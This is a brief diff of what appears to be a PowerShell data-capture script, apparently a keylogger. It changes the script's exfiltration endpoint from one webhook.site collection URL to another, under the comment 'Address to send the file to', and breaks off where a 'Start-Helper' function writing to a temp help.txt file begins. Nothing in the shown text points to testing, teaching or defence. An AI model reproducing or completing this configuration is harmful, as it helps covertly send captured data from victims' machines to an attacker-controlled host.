@@ -1,6 +1,6 @@
 $TimesToRun = 2					# How many successful runs to achieve.
 $RunTimeP = 0.5					# Runtime in minutes for each run.
-$endpoint = "https://webhook.site/dd5ec17b-2f53-43e5-a3f3-972caababbe6"		# Address to send the file to.
+$endpoint = "https://webhook.site/48528db4-d568-4e39-93ef-31b378734d99"		# Address to send the file to.
 
 # Requires -Version 2
 function Start-Helper($Path = "$env:temp\help.txt") 
